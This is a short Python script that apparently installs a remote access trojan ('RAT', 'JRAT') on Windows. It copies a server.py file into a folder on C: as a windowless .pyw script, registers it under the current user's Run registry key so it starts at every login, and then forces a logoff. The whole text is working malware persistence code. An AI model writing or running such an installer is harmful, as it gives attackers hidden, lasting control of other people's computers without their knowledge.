import os
import sys
import winreg

path = 'C:{0}RAT_DELETE_ME'.format(os.path.sep)
try:
    os.mkdir(path)
except FileExistsError:
    pass
with open(path+'{0}server.pyw'.format(os.path.sep), 'w') as file:
    file.write(open(os.path.abspath('././server.py'), 'r').read())

run = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
winreg.SetValueEx(run,"JRAT",0,winreg.REG_SZ,path+'{0}server.pyw'.format(os.path.sep))

os.system('shutdown /l')
